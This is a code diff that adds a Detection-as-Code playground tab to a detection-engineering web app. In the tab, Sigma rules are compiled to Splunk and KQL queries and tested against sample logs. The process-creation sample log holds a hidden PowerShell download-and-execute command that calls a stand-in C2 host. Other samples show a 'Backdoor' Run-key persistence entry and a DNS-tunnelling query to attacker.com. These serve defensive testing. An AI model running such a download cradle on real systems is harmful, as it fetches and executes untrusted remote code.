@@ -13,7 +13,8 @@ import {
   runValidation,
   TELEMETRY_REQUIREMENTS,
   analyzeLogQuality,
-  generateScopingQueries
+  generateScopingQueries,
+  parseYamlRule
 } from "../src/data/athena_data";
 
 
@@ -161,7 +162,7 @@ function syntaxHighlight(jsonStr: string) {
 }
 
 export default function Home() {
-  const [activeTab, setActiveTab] = useState<'sandbox' | 'compiler' | 'validation' | 'telemetry_audit' | 'ir_scoper' | 'detections' | 'telemetry'>('sandbox');
+  const [activeTab, setActiveTab] = useState<'sandbox' | 'compiler' | 'validation' | 'telemetry_audit' | 'ir_scoper' | 'detections' | 'telemetry' | 'playground'>('playground');
   const [activeCampaignId, setActiveCampaignId] = useState<string>('apt29');
   const [highlightedTechId, setHighlightedTechId] = useState<string | null>(null);
   const [expandedLogIndexes, setExpandedLogIndexes] = useState<Set<number>>(new Set());
@@ -191,6 +192,20 @@ export default function Home() {
   const [scoperHashes, setScoperHashes] = useState<string>("");
   const [scoperQueries, setScoperQueries] = useState<{ splunk: string; kql: string } | null>(null);
 
+  // DaC Playground State
+  const [playgroundTemplate, setPlaygroundTemplate] = useState<string>("process_creation");
+  const [playgroundYaml, setPlaygroundYaml] = useState<string>("");
+  const [playgroundLog, setPlaygroundLog] = useState<string>("");
+  const [playgroundEvaluationResult, setPlaygroundEvaluationResult] = useState<{
+    evaluated: boolean;
+    triggered: boolean;
+    error: string | null;
+  }>({
+    evaluated: false,
+    triggered: false,
+    error: null
+  });
+
   // Sync sample JSON to editor when source type changes
   useEffect(() => {
     const sourceToRuleMap: Record<string, string> = {
@@ -211,6 +226,31 @@ export default function Home() {
     }
     setAuditReport(null);
   }, [selectedSourceType]);
+
+  // Sync DaC Playground templates and logs
+  useEffect(() => {
+    const templates: Record<string, { yaml: string; log: string }> = {
+      process_creation: {
+        yaml: `title: Suspicious Process Launch\ndescription: Detects the launch of suspicious shells or script interpreters.\nseverity: medium\nstatus: experimental\nauthor: Detection Engineer\nlogsource:\n  category: endpoint\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 1\n    Image:\n      - '*\\cmd.exe'\n      - '*\\powershell.exe'\n      - '*\\wscript.exe'\n      - '*\\cscript.exe'\n  condition: selection`,
+        log: `{\n  "EventID": 1,\n  "Image": "C:\\\\Windows\\\\System32\\\\powershell.exe",\n  "CommandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.internal/payload')"\n}`
+      },
+      registry_mod: {
+        yaml: `title: Registry Persistence Run Key\ndescription: Detects modifications to Windows run keys used to establish persistent access.\nseverity: high\nstatus: experimental\nauthor: Detection Engineer\nlogsource:\n  category: endpoint\n  product: windows\n  service: sysmon\ndetection:\n  selection:\n    EventID: 13\n    TargetObject:\n      - '*\\Microsoft\\Windows\\CurrentVersion\\Run\\*'\n      - '*\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*'\n  condition: selection`,
+        log: `{\n  "EventID": 13,\n  "TargetObject": "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Backdoor",\n  "Details": "C:\\\\Windows\\\\Temp\\\\agent.exe"\n}`
+      },
+      dns_tunnel: {
+        yaml: `title: DNS Tunneling Detection\ndescription: Detects DNS queries with abnormally long query strings or TXT records.\nseverity: high\nstatus: test\nauthor: Detection Engineer\nlogsource:\n  category: network\n  product: dns\n  service: queries\ndetection:\n  selection:\n    query_length: '> 80'\n    query_type: 'TXT'\n  condition: selection`,
+        log: `{\n  "query": "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789.attacker.com",\n  "query_type": "TXT",\n  "query_length": 86,\n  "src_ip": "10.0.0.4"\n}`
+      }
+    };
+
+    const t = templates[playgroundTemplate];
+    if (t) {
+      setPlaygroundYaml(t.yaml);
+      setPlaygroundLog(t.log);
+      setPlaygroundEvaluationResult({ evaluated: false, triggered: false, error: null });
+    }
+  }, [playgroundTemplate]);
 
   // References for scrolling elements
   const timelineItemRefs = useRef<Record<string, HTMLDivElement | null>>({});
@@ -421,6 +461,12 @@ export default function Home() {
           </button>
 
           <span className="text-[0.7rem] uppercase text-slate-500 tracking-wider font-semibold mt-4 mb-2">Athena Pipeline</span>
+          <button 
+            onClick={() => setActiveTab('playground')}
+            className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'playground' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
+          >
+            💻 DaC Playground
+          </button>
           <button 
             onClick={() => setActiveTab('compiler')}
             className={`w-full text-left px-3 py-2 rounded-lg text-sm font-medium transition-all ${activeTab === 'compiler' ? 'bg-indigo-500/10 border border-indigo-500/30 text-indigo-300' : 'text-slate-400 hover:bg-slate-800/40'}`}
@@ -804,6 +850,220 @@ export default function Home() {
             </div>
           </>
         )}
+
+        {/* Active Tab: DaC Playground */}
+        {activeTab === 'playground' && (() => {
+          let parsedRule = null;
+          let parseError: string | null = null;
+          let splunkQuery = "";
+          let kqlQuery = "";
+
+          try {
+            parsedRule = parseYamlRule(playgroundYaml);
+            splunkQuery = compileToSplunk(parsedRule);
+            kqlQuery = compileToKql(parsedRule);
+          } catch (e: any) {
+            parseError = e.message;
+          }
+
+          const handleEvaluatePlayground = () => {
+            if (!parsedRule) {
+              setPlaygroundEvaluationResult({ evaluated: true, triggered: false, error: "Rule is invalid or not parsed correctly." });
+              return;
+            }
+            try {
+              const record = JSON.parse(playgroundLog);
+              const triggered = evaluateRuleAgainstRecord(parsedRule, record);
+              setPlaygroundEvaluationResult({ evaluated: true, triggered, error: null });
+            } catch (e: any) {
+              setPlaygroundEvaluationResult({ evaluated: true, triggered: false, error: `Invalid log JSON: ${e.message}` });
+            }
+          };
+
+          return (
+            <>
+              <header className="border-b border-slate-800/60 pb-5">
+                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
+                  💻 Detection-as-Code Playground
+                </h2>
+                <p className="text-slate-400 text-sm max-w-4xl">
+                  Write, compile, and validate detection rules in real-time. Select a template or write your custom Sigma rule, inspect the compiled SPL and KQL queries, and test them instantly against simulation logs.
+                </p>
+              </header>
+
+              <div className="grid grid-cols-1 xl:grid-cols-12 gap-8">
+                {/* Column 1: Rule Editor (YAML) - Span 4 */}
+                <div className="xl:col-span-4 flex flex-col gap-5">
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
+                    <div>
+                      <label htmlFor="playground-template-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-2">
+                        Starter Template
+                      </label>
+                      <select 
+                        id="playground-template-select"
+                        value={playgroundTemplate}
+                        onChange={(e) => setPlaygroundTemplate(e.target.value)}
+                        className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
+                      >
+                        <option value="process_creation">Process Creation (Sysmon Event ID 1)</option>
+                        <option value="registry_mod">Registry Modification (Sysmon Event ID 13)</option>
+                        <option value="dns_tunnel">DNS Query (DNS Log)</option>
+                      </select>
+                    </div>
+                  </div>
+
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex-1 flex flex-col backdrop-blur-xl min-h-[400px]">
+                    <div className="flex justify-between items-center mb-3">
+                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Sigma YAML Editor</span>
+                      {parseError ? (
+                        <span className="text-[0.65rem] bg-rose-500/10 text-rose-400 border border-rose-500/20 px-2 py-0.5 rounded font-mono font-semibold">
+                          Malformed YAML
+                        </span>
+                      ) : (
+                        <span className="text-[0.65rem] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded font-mono font-semibold">
+                          YAML Valid
+                        </span>
+                      )}
+                    </div>
+                    
+                    <textarea
+                      value={playgroundYaml}
+                      onChange={(e) => setPlaygroundYaml(e.target.value)}
+                      className="flex-grow w-full bg-[#05070c] border border-slate-800 rounded-xl p-4 text-[0.72rem] font-mono text-indigo-300 focus:outline-none focus:border-indigo-500 resize-none h-[420px]"
+                      placeholder="Type your Sigma YAML rule here..."
+                    />
+                    
+                    {parseError && (
+                      <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-3 rounded-lg text-[0.7rem] mt-3 font-mono leading-normal">
+                        Error: {parseError}
+                      </div>
+                    )}
+                  </div>
+                </div>
+
+                {/* Column 2: Compiled SIEM Queries - Span 4 */}
+                <div className="xl:col-span-4 flex flex-col gap-6">
+                  {/* Splunk Compiler Output */}
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl">
+                    <div className="flex justify-between items-center mb-3">
+                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
+                        <span>🪵</span> Splunk SPL Query
+                      </span>
+                      <button
+                        id="playground-splunk-copy"
+                        onClick={() => handleCopyCommand(splunkQuery, "playground-splunk-copy")}
+                        disabled={!!parseError || !splunkQuery}
+                        className="text-[0.68rem] bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold px-2 py-1 rounded transition-all cursor-pointer disabled:opacity-50"
+                      >
+                        Copy
+                      </button>
+                    </div>
+                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre-wrap leading-relaxed min-h-[140px] select-all">
+                      {parseError ? "--- Compilation paused due to YAML validation error ---" : splunkQuery || "--- Awaiting compilation ---"}
+                    </pre>
+                  </div>
+
+                  {/* KQL Compiler Output */}
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl">
+                    <div className="flex justify-between items-center mb-3">
+                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
+                        <span>☁️</span> Sentinel KQL Query
+                      </span>
+                      <button
+                        id="playground-kql-copy"
+                        onClick={() => handleCopyCommand(kqlQuery, "playground-kql-copy")}
+                        disabled={!!parseError || !kqlQuery}
+                        className="text-[0.68rem] bg-slate-900 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold px-2 py-1 rounded transition-all cursor-pointer disabled:opacity-50"
+                      >
+                        Copy
+                      </button>
+                    </div>
+                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-purple-300 overflow-x-auto whitespace-pre-wrap leading-relaxed min-h-[140px] select-all">
+                      {parseError ? "--- Compilation paused due to YAML validation error ---" : kqlQuery || "--- Awaiting compilation ---"}
+                    </pre>
+                  </div>
+
+                  {/* Rule details meta box */}
+                  {parsedRule && !parseError && (
+                    <div className="bg-[#0d111c]/50 border border-slate-800/60 rounded-2xl p-5 text-xs text-slate-400 flex flex-col gap-3">
+                      <h4 className="font-bold text-slate-300 uppercase tracking-wider">Detection Parameters</h4>
+                      <div>
+                        <span className="text-slate-500">Title:</span> <span className="text-slate-200 font-medium">{parsedRule.title}</span>
+                      </div>
+                      <div>
+                        <span className="text-slate-500">Severity:</span> <span className={`font-semibold capitalize ${parsedRule.severity === 'critical' ? 'text-rose-400' : parsedRule.severity === 'high' ? 'text-amber-400' : 'text-blue-400'}`}>{parsedRule.severity}</span>
+                      </div>
+                      <div>
+                        <span className="text-slate-500">Logsource:</span> <span className="text-slate-300 font-mono bg-slate-900 px-1.5 py-0.5 rounded border border-slate-800">{parsedRule.logsource.product || 'any'}:{parsedRule.logsource.service || 'any'}</span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* Column 3: Event Log Simulator - Span 4 */}
+                <div className="xl:col-span-4 flex flex-col gap-5">
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex flex-col backdrop-blur-xl flex-1">
+                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-3">
+                      Event Log Simulator (JSON)
+                    </span>
+                    <textarea
+                      value={playgroundLog}
+                      onChange={(e) => setPlaygroundLog(e.target.value)}
+                      className="flex-grow w-full bg-[#05070c] border border-slate-800 rounded-xl p-4 text-[0.72rem] font-mono text-cyan-400 focus:outline-none focus:border-indigo-500 resize-none h-[220px]"
+                      placeholder="Paste simulation telemetry log here..."
+                    />
+
+                    <button
+                      onClick={handleEvaluatePlayground}
+                      disabled={!!parseError}
+                      className="mt-4 w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 disabled:opacity-50 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
+                    >
+                      ⚡ Evaluate Detection Logic
+                    </button>
+                  </div>
+
+                  {/* Evaluation output feedback panel */}
+                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-3">
+                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
+                      Simulation Outcome
+                    </span>
+
+                    {!playgroundEvaluationResult.evaluated ? (
+                      <div className="bg-slate-900/40 border border-slate-800/80 p-4 rounded-xl text-center text-xs text-slate-500">
+                        Awaiting evaluation trigger...
+                      </div>
+                    ) : playgroundEvaluationResult.error ? (
+                      <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-4 rounded-xl text-xs font-mono">
+                        ⚠️ Evaluation Error:<br />
+                        {playgroundEvaluationResult.error}
+                      </div>
+                    ) : playgroundEvaluationResult.triggered ? (
+                      <div className="bg-emerald-950/20 border border-emerald-500/40 p-4 rounded-xl flex flex-col gap-2">
+                        <div className="text-emerald-400 font-bold text-xs flex items-center gap-1.5">
+                          <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></span>
+                          ✅ Alert Triggered Successfully!
+                        </div>
+                        <p className="text-[0.7rem] text-slate-400 leading-normal">
+                          The log matching selectors satisfied the rule's boolean condition: <span className="font-mono text-emerald-300">({parsedRule?.detection.condition})</span>. This event would trigger an active alert in the SIEM pipeline.
+                        </p>
+                      </div>
+                    ) : (
+                      <div className="bg-slate-900/60 border border-slate-800/80 p-4 rounded-xl flex flex-col gap-2">
+                        <div className="text-slate-400 font-bold text-xs flex items-center gap-1.5">
+                          <span className="w-2.5 h-2.5 rounded-full bg-slate-500"></span>
+                          ❌ Alert Suppressed / Ignored
+                        </div>
+                        <p className="text-[0.7rem] text-slate-500 leading-normal">
+                          The log details did not trigger the detection criteria. The rule condition <span className="font-mono">({parsedRule?.detection.condition})</span> evaluated to false. No alert generated.
+                        </p>
+                      </div>
+                    )}
+                  </div>
+                </div>
+              </div>
+            </>
+          );
+        })()}
 
         {/* Active Tab: SIEM COMPILER */}
         {activeTab === 'compiler' && (() => {
